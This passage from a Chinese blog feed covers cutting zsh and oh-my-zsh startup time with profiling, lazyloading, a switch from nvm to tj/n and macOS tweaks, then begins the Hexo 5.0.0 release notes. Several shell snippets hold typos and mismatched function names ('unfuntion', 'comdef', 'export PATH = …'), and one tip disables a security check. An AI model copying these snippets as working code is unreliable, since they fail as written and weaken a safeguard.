10.83    1.81%     21.66    10.83    1.81%  compaudit 9)    1          17.31    17.31    1.45%     17.31    17.31    1.45%  nvm_is_version_installed10)  193          17.43     0.09    1.46%     14.50     0.08    1.21%  _zsh_autosuggest_bind_widget[Redacted]</code></pre>\n<p><code>zprof</code> 模块只能获取每个 zsh 函数的用时，因此适合找出拖累 zsh 冷启动的 oh my zsh 的插件。如果要获取完整的 <code>.zshrc</code> 性能分析，应该使用 <code>xtrace</code>。在 <code>.zshrc</code> 开头添加如下命令：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-comment\"># .zshrc</span><span class=\"hljs-built_in\">zmodload</span> zsh/datetime<span class=\"hljs-built_in\">setopt</span> PROMPT_SUBSTPS4=<span class=\"hljs-string\">'+$EPOCHREALTIME %N:%i&gt; '</span>logfile=$(mktemp zsh_profile.7Pw1Ny0G)<span class=\"hljs-built_in\">echo</span> <span class=\"hljs-string\">\"Logging to <span class=\"hljs-variable\">$logfile</span>\"</span><span class=\"hljs-built_in\">exec</span> 3&gt;&amp;2 2&gt;<span class=\"hljs-variable\">$logfile</span><span class=\"hljs-built_in\">setopt</span> XTRACE</code></pre>\n<p>并在 <code>.zshrc</code> 结尾添加如下命令：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-comment\"># .zshrc</span><span class=\"hljs-built_in\">unsetopt</span> XTRACE<span class=\"hljs-built_in\">exec</span> 2&gt;&amp;3 3&gt;&amp;-</code></pre>\n<p>这会在 <code>$HOME</code> 目录下生成一个文件名包含随机字符串的文件（<code>zsh_profile.123456</code> ）。一些介绍 zsh profiling 的文章会推荐使用 <a href=\"http://kcachegrind.sourceforge.net/html/Home.html\">kcachegrind</a> 这个工具可视化这个文件，但是我们只需要知道是什么拖累了 zsh 冷启动，将这个文件格式化一下即可。这里提供一个简单的脚本：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-meta\">#!/usr/bin/env zsh</span><span class=\"hljs-built_in\">typeset</span> -a lines<span class=\"hljs-built_in\">typeset</span> -i prev_time=0<span class=\"hljs-built_in\">typeset</span> prev_command<span class=\"hljs-keyword\">while</span> <span class=\"hljs-built_in\">read</span> line; <span class=\"hljs-keyword\">do</span>    <span class=\"hljs-keyword\">if</span> [[ <span class=\"hljs-variable\">$line</span> =~ <span class=\"hljs-string\">'^.*\\+([0-9]{10})\\.([0-9]{6})[0-9]* (.+)'</span> ]]; <span class=\"hljs-keyword\">then</span>        <span class=\"hljs-built_in\">integer</span> this_time=<span class=\"hljs-variable\">$match</span>[1]<span class=\"hljs-variable\">$match</span>[2]        <span class=\"hljs-keyword\">if</span> [[ <span class=\"hljs-variable\">$prev_time</span> -gt 0 ]]; <span class=\"hljs-keyword\">then</span>            time_difference=$(( <span class=\"hljs-variable\">$this_time</span> - <span class=\"hljs-variable\">$prev_time</span> ))            lines+=<span class=\"hljs-string\">\"<span class=\"hljs-variable\">$time_difference</span> <span class=\"hljs-variable\">$prev_command</span>\"</span>        <span class=\"hljs-keyword\">fi</span>        prev_time=<span class=\"hljs-variable\">$this_time</span>        <span class=\"hljs-built_in\">local</span> this_command=<span class=\"hljs-variable\">$match</span>[3]        <span class=\"hljs-keyword\">if</span> [[ <span class=\"hljs-variable\">${#this_command}</span> -le 80 ]]; <span class=\"hljs-keyword\">then</span>            prev_command=<span class=\"hljs-variable\">$this_command</span>        <span class=\"hljs-keyword\">else</span>            prev_command=<span class=\"hljs-string\">\"<span class=\"hljs-variable\">${this_command:0:77}</span>...\"</span>        <span class=\"hljs-keyword\">fi</span>    <span class=\"hljs-keyword\">fi</span><span class=\"hljs-keyword\">done</span> &lt; <span class=\"hljs-variable\">${1:-/dev/stdin}</span><span class=\"hljs-built_in\">print</span> -l <span class=\"hljs-variable\">${(@On)lines}</span></code></pre>\n<p>将上述内容保存在 <code>$HOME</code> 目录下 <code>format_profile.zsh</code> 文件中，然后在终端中执行：</p>\n<pre><code class=\"hljs bash\">$ <span class=\"hljs-built_in\">cd</span> <span class=\"hljs-variable\">$HOME</span>$ chmod +x format_profile.zsh$ ./format_profile.zsh zsh_profile.123456 | head -n 30356910 _zsh_nvm_auto_use:14&gt; [[ none != N/A ]]307791 /Users/sukka/.zshrc:312&gt; hexo <span class=\"hljs-string\">'--completion=zsh'</span>178444 /Users/sukka/.zshrc:310&gt; thefuck --<span class=\"hljs-built_in\">alias</span>161193 nvm_version:21&gt; VERSION=N/A148555 nvm_version:21&gt; VERSION=N/A96497 (<span class=\"hljs-built_in\">eval</span>):4&gt; pyenv <span class=\"hljs-built_in\">rehash</span>58759 /Users/sukka/.zshrc:311&gt; pyenv init -48629 nvm_auto:15&gt; VERSION=<span class=\"hljs-string\">''</span>42779 /Users/sukka/.zshrc:114&gt; FPATH=/usr/<span class=\"hljs-built_in\">local</span>/share/zsh/site-functions:/usr/<span class=\"hljs-built_in\">local</span>...42527 nvm_auto:15&gt; nvm_resolve_local_alias default41620 nvm_resolve_local_alias:7&gt; VERSION=<span class=\"hljs-string\">''</span>35577 nvm_resolve_local_alias:7&gt; VERSION=<span class=\"hljs-string\">''</span>29444 _zsh_nvm_load:6&gt; <span class=\"hljs-built_in\">source</span> /Users/sukka/.nvm/nvm.sh24967 compaudit:154&gt; _i_wfiles=( )24889 nvm_resolve_alias:15&gt; ALIAS_TEMP=<span class=\"hljs-string\">''</span>22000 nvm_auto:18&gt; nvm_rc_version20890 nvm_ls:29&gt; PATTERN=default[Redacted]</code></pre>\n<p>这样就一目了然了。可以看到，除了 <code>nvm</code> 以外、<code>hexo</code> 的自动补全、<code>thefuck</code> 的初始化、<code>pyenv</code> 都大幅拖慢了 zsh 的启动速度。</p>\n<h2>Lazyload</h2>\n<p>你可能听过 <a href=\"https://blog.skk.moe/post/img-lazyload-hexo/\">网页的图片可以 lazyload</a>、<a href=\"https://blog.skk.moe/post/prevent-disqus-from-slowing-your-site/\">Disqus 评论系统可以 lazyload</a>，但是 <code>.zshrc</code> 一样也有 lazyload。lazyload 的特点是启动时快，首次使用时慢，因此很适合用于优化不常用而且初始化非常耗时的功能。</p>\n<p>lazyload 的方法是声明一个占位函数，当执行这个函数时完成对真实命令的初始化、并移除命令占位。以 pyenv 为例：</p>\n<pre><code class=\"hljs sh\"><span class=\"hljs-comment\"># 提前将 .pyenv/shims 添加到 PATH 中，这样即使 pyenv 没有初始化也可以使用 Python</span><span class=\"hljs-built_in\">export</span> PATH=<span class=\"hljs-string\">\"/Users/sukka/.pyenv/shims:<span class=\"hljs-variable\">${PATH}</span>\"</span><span class=\"hljs-function\"><span class=\"hljs-title\">pyenv</span></span>() {  <span class=\"hljs-comment\"># 移除占位函数</span>  unfuntion pyenv  <span class=\"hljs-comment\"># 初始化 pyenv</span>  <span class=\"hljs-built_in\">eval</span> <span class=\"hljs-string\">\"<span class=\"hljs-subst\">$(command pyenv init -)</span>\"</span>  <span class=\"hljs-comment\"># 继续执行 pyenv 命令</span>  pyenv <span class=\"hljs-string\">\"<span class=\"hljs-variable\">$@</span>\"</span>}</code></pre>\n<p>pyenv 在初始化时会自动加载补全（completion），但是由于 lazyload、第一次执行 <code>pyenv</code> 时就没有补全了，因此还需要为补全添加 lazyload：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-function\"><span class=\"hljs-title\">__lazyload_completion_pyenv</span></span>() {  <span class=\"hljs-comment\"># 删除 pyenv 命令补全的占位</span>  comdef -d pyenv  <span class=\"hljs-comment\"># 移除 pyenv 占位函数</span>  <span class=\"hljs-built_in\">unfunction</span> pyenv  <span class=\"hljs-comment\"># 加载真正的 pyenv 命令补全</span>  <span class=\"hljs-built_in\">source</span> <span class=\"hljs-string\">\"<span class=\"hljs-subst\">$(brew --prefix pyenv)</span>/completions/pyenv.zsh\"</span>}compdef __lazyload_completion_pyenv pyenv</code></pre>\n<p>这样，当首次输入 <code>pyenv</code> 并按下 Tab 时会加载 pyenv 的命令补全，第二次按下 Tab 时就可以正常显示命令补全了。</p>\n<p>将上述 lazyload 封装成函数便于调用：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-function\"><span class=\"hljs-title\">sukka_lazyload_add_command</span></span>() {    <span class=\"hljs-built_in\">eval</span> <span class=\"hljs-string\">\"<span class=\"hljs-variable\">$1</span>() { \\</span><span class=\"hljs-string\">        unfunction <span class=\"hljs-variable\">$1</span> \\</span><span class=\"hljs-string\">        _sukka_lazyload__command_<span class=\"hljs-variable\">$1</span> \\</span><span class=\"hljs-string\">        <span class=\"hljs-variable\">$1</span> \\$@ \\</span><span class=\"hljs-string\">    }\"</span>}<span class=\"hljs-function\"><span class=\"hljs-title\">sukka_lazyload_add_completion</span></span>() {    <span class=\"hljs-built_in\">local</span> comp_name=<span class=\"hljs-string\">\"_sukka_lazyload__compfunc_<span class=\"hljs-variable\">$1</span>\"</span>    <span class=\"hljs-built_in\">eval</span> <span class=\"hljs-string\">\"<span class=\"hljs-variable\">${comp_name}</span>() { \\</span><span class=\"hljs-string\">        compdef -d <span class=\"hljs-variable\">$1</span>; \\</span><span class=\"hljs-string\">        _sukka_lazyload_completion_<span class=\"hljs-variable\">$1</span>; \\</span><span class=\"hljs-string\">    }\"</span>    compdef <span class=\"hljs-variable\">$comp_name</span> <span class=\"hljs-variable\">$1</span>}</code></pre>\n<p>使用封装好的 lazyload 函数添加 <code>pyenv</code> 和 <code>thefuck</code> 的 lazyload、Hexo completion 的 lazyload：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-function\"><span class=\"hljs-title\">_sukka_lazyload__command_pyenv</span></span>() {  <span class=\"hljs-comment\"># pyenv 初始化</span>  <span class=\"hljs-built_in\">eval</span> <span class=\"hljs-string\">\"<span class=\"hljs-subst\">$(command pyenv init -)</span>\"</span>}<span class=\"hljs-function\"><span class=\"hljs-title\">_sukka_lazyload__compfunc_pyenv</span></span>() {  <span class=\"hljs-comment\"># pyenv 命令补全</span>  <span class=\"hljs-built_in\">source</span> <span class=\"hljs-string\">\"<span class=\"hljs-subst\">$(brew --prefix pyenv)</span>/completions/pyenv.zsh\"</span>}<span class=\"hljs-comment\"># 添加 pyenv 的 lazyload</span>sukka_lazyload_add_command pyenvsukka_lazyload_add_completion pyenv<span class=\"hljs-function\"><span class=\"hljs-title\">_sukka_lazyload__command_fuck</span></span>() {  <span class=\"hljs-comment\"># fuck 初始化</span>  <span class=\"hljs-built_in\">eval</span> $(thefuck --<span class=\"hljs-built_in\">alias</span>)}<span class=\"hljs-comment\"># 添加 fuck 的 lazyload</span>sukka_lazyload_add_command fuck<span class=\"hljs-function\"><span class=\"hljs-title\">_sukka_lazyload__completion_hexo</span></span>() {  <span class=\"hljs-comment\"># hexo 的 completion</span>  <span class=\"hljs-built_in\">eval</span> $(hexo --completion=zsh)}<span class=\"hljs-comment\"># 添加 hexo completion 的 lazyload</span>sukka_lazyload_add_completion hexo</code></pre>\n<h2>替换 NVM</h2>\n<p>我使用 nvm 的方式是 <code>zsh-nvm</code> 插件。由于我的开发环境也高度依赖 <code>.nvmrc</code> 文件，所以不得不启用 nvm auto use。由于我的许多工具高度依赖 Node.js（如我的 <a href=\"https://nali.skk.moe/\">Nali CLI</a>），lazyload nvm 也是不现实的。我不得不寻找另一个代替 nvm 的 Node.js 版本管理器，最后我选中了 <a href=\"https://github.com/tj/n\"><code>tj/n</code></a>。</p>\n<p>首先是卸载 nvm、nvm 安装的所有 Node.js 版本、以及 zsh-nvm 插件：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-comment\"># 卸载 nvm 及其安装的 Node.js</span>$ rm -rf <span class=\"hljs-variable\">$HOME</span>/.nvm<span class=\"hljs-comment\"># 删除 zsh-nvm 插件</span>$ rm -rf <span class=\"hljs-variable\">$ZSH</span>/custom/plugins/zsh-nvm<span class=\"hljs-comment\"># 除了删除目录，还需要在 .zshrc 中的 plugins 数组中删除 zsh-nvm</span></code></pre>\n<p>接着安装 <code>tj/n</code> 作为 Node.js 版本管理器，macOS 上可以通过 Homebrew 直接安装：</p>\n<pre><code class=\"hljs bash\">$ brew install n</code></pre>\n<p>在 <code>.zshrc</code> 中配置 <code>tj/n</code>：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-comment\"># tj/n 的路径</span><span class=\"hljs-built_in\">export</span> N_PREFIX=<span class=\"hljs-string\">\"<span class=\"hljs-variable\">$HOME</span>/.n\"</span><span class=\"hljs-comment\"># 当切换 Node.js 版本时保留 npm</span><span class=\"hljs-built_in\">export</span> N_PRESERVE_NPM=1<span class=\"hljs-comment\"># 将 tj/n 添加到 PATH</span><span class=\"hljs-built_in\">export</span> PATH = <span class=\"hljs-string\">\"<span class=\"hljs-variable\">$N_PREFIX</span>/bin:<span class=\"hljs-variable\">$PATH</span>\"</span></code></pre>\n<h2>使用 zsh 内置语法</h2>\n<p>zsh 强大之处不仅在于内建的插件、优雅的使用方式，更重要的是极其强大的语法。在 <code>.zshrc</code> 广泛使用 zsh 内置的语法可以大幅提高执行性能。</p>\n<h3>zsh 判断命令是否存在</h3>\n<p>我们经常需要在 <code>.zshrc</code> 之中编写命令是否存在的条件语句，比如「仅当命令存在时加载该命令的自动补全」，或者「当 Node.js 存在时输出 Node.js 版本」。通常情况下我们会写出以下三种条件判断方式：</p>\n<pre><code class=\"hljs bash\">[[ <span class=\"hljs-built_in\">command</span> -v node &amp;&gt;/dev/null ]] &amp;&amp; node -v[[ <span class=\"hljs-built_in\">which</span> -a node &amp;&gt;/dev/null ]] &amp;&amp; node -v[[ <span class=\"hljs-built_in\">type</span> node &amp;&gt;/dev/null ]] &amp;&amp; node -v</code></pre>\n<p>但是在 zsh 中，还有一种速度更快的判断命令存在的方法：</p>\n<pre><code class=\"hljs bash\">(( $+commands[node] )) &amp;&amp; node -v</code></pre>\n<p>zsh 提供了一个数组元素查找语法 <code>$+array[item]</code> （元素存在则返回 1 否则返回 0），同时 zsh 也维护了一个命令数组 <code>$commands</code>，在数组中检索元素比调用 <code>which</code>、<code>type</code>、<code>command -v</code> 命令都要快许多。</p>\n<h3>变量字符串查找</h3>\n<p>在 <code>.zshrc</code> 中鲜少需要用到这样的语法，不过依然存在一些 case，比如为了避免向 <code>$FPATH</code> 中重复添加 Homebrew 的自动补全，提前检查 <code>$FPATH</code> 中是否已经包含了 Homebrew 的路径。一般常见的写法都涉及到 <code>echo</code> 和 <code>grep</code> ：</p>\n<pre><code class=\"hljs bash\">[[ $(<span class=\"hljs-built_in\">echo</span> <span class=\"hljs-variable\">$FPATH</span> | grep <span class=\"hljs-string\">\"/usr/local/share/zsh/site-functions\"</span>) ]] &amp;&amp; <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-string\">\"homebrew exists in fpath\"</span></code></pre>\n<p>但是在 zsh 中我们不需要 <code>grep</code> 也可以实现同样的功能：</p>\n<pre><code class=\"hljs bash\">(( <span class=\"hljs-variable\">$FPATH</span>[(I)/usr/<span class=\"hljs-built_in\">local</span>/share/zsh/site-functions] )) &amp;&amp; <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-string\">\"homebrew exists in fpath\"</span></code></pre>\n<p>zsh 内置了在变量中匹配字符串的语法：<code>$variable[(i)keyword]</code> 和 <code>$variable[(I)keyword]</code>，前者是从左往右寻找、后者是从右往左寻找，返回值为第一个匹配的首字符位置，当没有匹配时返回值则是变量的最终位置，也就是说当找不到匹配时 <code>(i)</code> 会返回字符串的长度、而 <code>(I)</code> 会返回 0。因此只需要从右往左寻找、判断返回值是否为 0 即可，搭配将数字转化为布尔值的 <code>(( ))</code> 就可以写出又快又漂亮的条件语句。</p>\n<h3>变量字符串替换</h3>\n<p>当需要截断或者替换字符串时，大部分人第一时间会想到 <code>sed</code> ，因当此需要替换变量中的字符时自然而然的会使用 <code>echo | sed</code>。比如，在 macOS 中主机名 <code>$HOST</code> 变量通常以 <code>.local</code> 结尾：</p>\n<pre><code class=\"hljs bash\">$ <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-variable\">$HOST</span>Sukka-MBP.local</code></pre>\n<p>如果要显示 <code>Sukka-MBP</code> （在 prompt 中常常会用到）就需要写成：</p>\n<pre><code class=\"hljs bash\">$ <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-variable\">$HOST</span> | sed -e <span class=\"hljs-string\">\"s/.local//\"</span>Sukka-MBP</code></pre>\n<p>但是，强大的 zsh 内置了简单的变量字符串替换语法，使用下述命令可以达到相同的效果：</p>\n<pre><code class=\"hljs bash\">$ <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-variable\">${HOST/.local/}</span>Sukka-MBP$ <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-variable\">${HOST/.local/.foxtail}</span>Sukka-MBP.foxtail</code></pre>\n<h2>其它优化手段</h2>\n<h3>禁用多余的插件</h3>\n<p>oh my zsh 在 Wiki 里说「Add wisely, as too many plugins slow down shell startup」。通过 profiling 可以发现一些插件（如 <code>git</code> 插件）执行耗时也不短。考虑到 oh my zsh 内置的 <code>git</code> 插件只是一些 alias、大部分我都用不到，因此将其从 <code>plugins</code> 数组中移除。</p>\n<h3>避免产生子进程</h3>\n<p>在 shell 中有不少语法会产生子进程。由于这些不受控制的子进程可能会产生其它子进程、从而导致潜在的巨大开销。常见的会产生子进程的语法有是 <code>eval</code> 和 Command substitution，在编写 <code>.zshrc</code> 时应该尽量避免使用它们。</p>\n<p>例如，Homebrew 是通过 Ruby —— 一种没有性能优势的语言编写的，而且 Homebrew 的开发者甚至因为不会翻转二叉树而错失了 Google 的 offer（想必大家大体可以猜得出 Homebrew 中的负优化），因此在 zsh 启动时产生一个子进程运行 Homebrew 将是不能忍受的，绝大部分使用 Homebrew 的人都不会改变 Homebrew 的路径，因此与其在 <code>.zshrc</code> 中使用 <code>$(brew --prefix)</code>，不如直接将命令执行的结果（<code>/usr/local</code>）直接写在 <code>.zshrc</code> 中。</p>\n<h3>启用 ZSH_DISABLE_COMPFIX</h3>\n<p>oh my zsh 内置了安全功能、避免 oh my zsh 插件使用不安全的目录和文件，但是这意味着插件在加载时需要通过一系列 security checker。通过禁用安全功能 （<code>export ZSH_DISABLE_COMPFIX=\"true\"</code>）可以使 zsh 启动速度加快 0.06s。微不足道，但值得一试。</p>\n<h2>针对 macOS 的优化</h2>\n<h3>path_helper</h3>\n<p>和 Linux 不同，在 macOS 上 zsh 启动序列的第一项为 <code>/etc/zprofile</code> 而不是 <code>~/.zprofile</code>。macOS 通过 <code>/etc/zprofile</code> 来调用 <code>path_helper</code>：</p>\n<pre><code class=\"hljs bash\">$ cat /etc/zprofile<span class=\"hljs-comment\"># System-wide .profile for sh(1)</span><span class=\"hljs-keyword\">if</span> [ -x /usr/libexec/path_helper ]; <span class=\"hljs-keyword\">then</span>  <span class=\"hljs-built_in\">eval</span> `/usr/libexec/path_helper -s`<span class=\"hljs-keyword\">fi</span><span class=\"hljs-keyword\">if</span> [ <span class=\"hljs-string\">\"<span class=\"hljs-variable\">${BASH-no}</span>\"</span> != <span class=\"hljs-string\">\"no\"</span> ]; <span class=\"hljs-keyword\">then</span>  [ -r /etc/bashrc ] &amp;&amp; . /etc/bashrc<span class=\"hljs-keyword\">fi</span></code></pre>\n<p>而 <code>path_helper</code> 又会读取 <code>/etc/paths</code> 、<code>/etc/paths/d</code>、<code>etc/manpaths</code> 和  <code>etc/manpaths.d</code>、并将其添加到 <code>$PATH</code> 和 <code>$MANPATH</code> 变量中。通过 <code>path_helper</code> macOS 提供了一种快速在不同 shell 中共享  <code>$PATH</code> 和 <code>$MANPATH</code> 的方法。过去，<code>path_helper</code> 是一个 <a href=\"https://mjtsai.com/blog/2009/04/01/slow-opening-terminal-windows\">运行速度很慢的 shell 脚本</a> 以至于有人制作了 <a href=\"https://gist.github.com/mkhl/123525\">专门的 patch</a>、甚至 <a href=\"https://github.com/mgprot/path_helper\">使用 Perl</a> 重写了一个替代品。不过 macOS 意识到了这个问题，现在 <code>path_helper</code> 不再是一个脚本而是一个预编译好的二进制文件。如果你通过 profiling 发现 <code>path_helper</code> 有在拖累 zsh 启动，那么可以考虑放弃使用 <code>/etc/paths/d</code>、而是在 <code>.zshrc</code> 中直接维护 <code>$PATH</code>。</p>\n<h3>login process</h3>\n<p>默认在启动、终端登陆 shell 时会触发 macOS 的 <code>login -fp username</code>。这一操作会调用 <code>syslog()</code> 函数向 <code>/var/log/asl</code> 写入日志、并读取上一次登录记录、以 <code>Last login</code> 的形式显示出来。你可以使用下述命令证实这一行为：</p>\n<pre><code class=\"hljs bash\">ps -ef | grep login</code></pre>\n<p>如果想要通过减少日志写入来加快 zsh 启动速度，可以修改 <code>etc/asl.conf</code> 配置文件中定义的日志等级。</p>\n<p>不少文章也提到，修改 iTerm2 设置中的 <code>Login Command</code> 为 <code>/bin/zsh</code> 可以加快 zsh 启动速度，本质上也是绕过了上述读取和写入日志的环节。</p>\n<blockquote><p>ASL 即 <strong>A</strong>pple <strong>S</strong>ystem <strong>L</strong>og，macOS 10.12 起被弃用，但是仍有系统组件在使用这一接口。</p></blockquote>\n<h2>尾声</h2>\n<p>经过一系列优化，我终于让 zsh 启动速度提升了十倍，速度甚至不亚于 fish 等以性能著称的 shell：</p>\n<pre><code class=\"hljs bash\">$ <span class=\"hljs-keyword\">for</span> i <span class=\"hljs-keyword\">in</span> $(seq 1 5); <span class=\"hljs-keyword\">do</span> /usr/bin/time /bin/zsh -i -c <span class=\"hljs-built_in\">exit</span>; <span class=\"hljs-keyword\">done</span>        0.14 real         0.08 user         0.05 sys        0.12 real         0.07 user         0.04 sys        0.12 real         0.07 user         0.04 sys        0.13 real         0.07 user         0.04 sys        0.13 real         0.07 user         0.04 sys</code></pre>\n<p>如果对我的 <code>.zshrc</code> 文件感兴趣，可以 <a href=\"https://github.com/SukkaW/dotfiles/blob/master/_zshrc/macos.zshrc\">前往 GitHub 查看我开源的 dotfiles</a>。</p>\n<div class=\"license\"> <div class=\"license-title\">我就感觉到快 —— zsh 和 oh my zsh 冷启动速度优化</div> <div class=\"license-link\"><a href=\"https://blog.skk.moe/post/make-oh-my-zsh-fly/\">https://blog.skk.moe/post/make-oh-my-zsh-fly/</a></div> <div class=\"license-meta\"> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">本文作者</div> <div class=\"license-meta-text\">Sukka</div> </div> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">发布于</div> <div class=\"license-meta-text\">2020-08-10</div> </div>\n<div class=\"license-meta-item\"> <div class=\"license-meta-title\">许可协议</div> <div class=\"license-meta-text\"><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div> </div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/make-oh-my-zsh-fly/"},{"title":"Hexo 5.0.0 正式发布","date":"2020-07-24 02:24:00","description":"\n<p>Node.js 上最快的静态站点生成器 Hexo 发布了 5.0.0 版本。作为 Hexo 核心团队成员，让我为大家介绍一下 Hexo 5.0.0 中的新特性，以及如何从 Hexo 4.x 版本升级到 Hexo 5.0.0。</p>\n<h2>新特性</h2>\n<h3>通过 npm 安装主题</h3>\n<p>过去，安装 Hexo 主题需要 <code>git clone</code> 或者下载、解压 zip；更新主题时还需要迁移 <code>_config.yml</code> 。Hexo 5.0.0 支持通过 npm 安装主题。现在安装一个主题只需要三步：</p>\n<ul>\n<li><p>使用  <code>npm install hexo-theme-[主题的名称]</code> 即可安装主题；</p></li>\n<li>\n<p>在站点的 <code>_config.yml</code> 中指定主题的名称：<br><br></p>\n<pre><code class=\"hljs yaml\"><span class=\"hljs-attr\">theme:</span> <span class=\"hljs-string\">\"[主题的名称]\"</span></code></pre>\n</li>\n<li><p>在站点根目录下新建一个文件 <code>_config.[主题的名称].yml</code>，在该文件中填入主题的配置即可。</p></li>\n</ul>\n<p>对于主题的开发者、插件开发者，以及进阶的 Hexo 用户来说，这是你们想要了解的技术细节：</p>\n<ul>\n<li>为了保证向后兼容性，Hexo 依然支持从 <code>themes/[主题的名称]</code> 目录加载主题。其中，<code>themes/[主题的名称]</code> 的优先级高于 <code>node_modules/hexo-theme-[主题的名称]</code>。也就是说，只有当 Hexo 发现 <code>themes/[主题的名称]</code> 目录不存在时，才会从  <code>node_modules/hexo-theme-[主题的名称]</code> 目录中加载主题。</li>\n<li>Hexo 5.0.0 新增了通过站点根目录下 <code>_config.[主题的名称].yml</code> 文件配置主题的功能。这是除主题目录下的 <code>_config.yml</code> 文件、以及站点配置文件的 <code>theme_config</code> 字段外第三种配置主题的方式。</li>\n<li>为保证向后兼容性，Hexo 会按照如下优先级 deep merge 三份主题配置：<code>站点配置文件的 theme_config 字段 &gt; 站点根目录下的 _config.[主题的名称].yml &gt; 主题目录下的 _config.yml</code>。因此，我们建议主题开发者尽量限制配置文件层级为 1 级，避免在 deep merge 时更深层级的配置项会被合并而不是被覆盖。</li>\n</ul>\n<h3>PrismJS 代码高亮支持</h3>\n<p>Hexo 5.0.0 新增了 PrismJS 代码高亮支持。</p>\n<p>相比 highlight.js 可以在 Node.js 环境执行（即：可在 Hexo 生成页面时进行代码高亮）不同，PrismJS 是一个轻量级的代码高亮库，绝大部分插件都依赖浏览器中执行。Hexo 为了尽可能兼容 PrismJS 的功能和插件，提供了「生成时渲染」和「浏览器渲染」两种模式：前者只需在主题之中引入 PrismJS 的 CSS 即可，但是无法使用大部分 PrismJS 的插件；后者需要在主题中同时引入 PrismJS 的 CSS 和 <code>prism.js</code>，但是可以兼容 PrismJS 大部分插件。</p>\n<p>关于 Hexo 主题的开发者适配 Hexo 的两种代码高亮的技术细节，我们专门撰写了 <a href=\"https://hexo.io/docs/syntax-highlight\">相关的文档页面</a> 以供参考。</p>\n<h3>静态 HTML 片段插入</h3>\n<p>插件开发者经常需要在页面中插入 HTML 片段：播放器插件需要往页面中插入 <code>player.css</code> 和 <code>player.js</code>，lazyload 插件的作者需要往页面中插入 <code>lazyload.js</code>，Live2D 插件的作者需要往页面中插入对应的 CSS 和 JS，等等。Hexo 5.0.0 新增了一个插件 API 接口 <code>Injector</code>，用于往页面的 <code>&lt;head&gt;</code> 和 <code>&lt;body&gt;</code> 标签中注入静态 HTML 片段。这一功能支持：</p>\n<ul>\n<li>在 <code>&lt;head&gt;</code> 之后、<code>&lt;/head&gt;</code> 之前、<code>&lt;body&gt;</code> 之后 和 <code>&lt;/body&gt;</code> 之前四个位置插入代码。</li>\n<li>支持只在特定页面注入 HTML 片段 —— 插件开发者可以仅往文章页面插入 HTML 片段而不影响其他页面如首页和归档。</li>\n</ul>\n<p>插件开发者请参考 Hexo 的 [Injector API 文档] 了解具体使用方法。</p>\n<h3>其他新特性</h3>\n<p>除上述三个重磅功能外，Hexo 还新增了其他功能，如：</p>\n<ul>\n<li>标签插件 API 新增 <code>unregister</code>å 方法</li>\n<li>\n<code>tagcloud</code> 辅助函数新增支持自定义 class 属性和 level</li>\n<li>\n<code>feed_tag</code> 辅助函数增加对 hexo-generator-feed 插件的兼容</li>\n<li>\n<code>youtube</code> 标签插件新增对 YouTube 播放列表的支持，以及可选使用 <code>www.youtube-nocookie.com</code> 域名</li>\n<li>\n<code>post_link</code> 标签插件在找不到对应文章时将会显示警告信息</li>\n<li>\n<code>post_permalink</code> 配置项新增支持 <code>:second</code> 属性</li>\n<li>当文章的标签插件出现渲染错误时，报错信息将会显示出错文件的路径</li>\n</ul>\n<h2>修复的 Bug</h2>\n<ul>\n<li>修复了 数个相邻的标签插件 无法渲染的 Bug</li>\n<li>修复了 文章中的代码块由于包含大括号（<code>{</code> 和 <code>}</code>）导致的渲染失败</li>\n<li>修复了 包含 Source Map 的 Hexo 插件无法加载的 Bug</li>\n<li>修复了 <code>code</code> 标签插件无法解析 <code>wrap</code> 选项的问题</li>\n<li>当 <code>post_asset_folder</code> 功能启用时，<code>hexo new</code> 命令将不再生成错误的 <code>index</code> 目录</li>\n</ul>\n<h2>性能改进</h2>\n<p>一如既往，Hexo 5.0.0 也带来了一系列性能改进，以提升 Hexo 的渲染性能。</p>\n<ul>\n<li>改进了标签插件的渲染性能</li>\n<li>优化了 <code>meta[generator]</code> 标签注入的逻辑</li>\n<li>优化为外部链接添加 <code>rel=noopenner</code> 和 <code>target=\"_blank\"</code> 功能的性能</li>\n<li>确保 <code>after_render:html</code> Filter 在每个页面只执行一次</li>\n<li>优化了 Filter API 的执行速度</li>\n<li>延迟加载代码高亮，减少 Hexo 启动用时</li>\n<li>当执行 <code>hexo clean</code> 时不再加载无关的插件</li>\n</ul>\n<h2>从 Hexo 4.x 升级到 Hexo 5.x</h2>\n<p>Hexo 5.0.0 引入了少数不向后兼容的功能，因此当你升级到 Hexo 5.0.0 时，需要遵循以下步骤进行迁移：</p>\n<h3>升级 Node.js</h3>\n<p>Hexo 5.0.0 不再支持 Node.js 8 及更低版本。为了使用 Hexo 5.0.0，请确保 Node.js 版本不低于 10.13.0。</p>\n<h3>文章 Front-Matter 不再支持 keywords 字段</h3>\n<p>过去这一字段被主要用于 <code>open_graph</code> 辅助函数。升级到 Hexo 5.0.0 后你无需去除现有文章的 Front-Matter 中的 <code>keywords</code> 字段，但这一字段将不会再起任何作用。</p>\n<h3>文章 Front-Matter 中 permalink 字段的行为</h3>\n<p>Hexo 5.0.0 修改了在文章的 Front Matter 中指定 <code>permalink</code> 字段的行为，与独立页面的 <code>permalink</code> 的行为一致。</p>\n<h3>全局变量中不再包含 Lodash</h3>\n<p>Hexo 5.0.0 去除了全局变量中的 Lodash，因此主题无法继续在模板中使用 Lodash。主题开发者应该遵循 <a href=\"https://github.com/you-dont-need/You-Dont-Need-Lodash-Underscore\">You-Dont-Need-Lodash-Underscore</a> 进行迁移。</p>\n<h3>用 updated_option 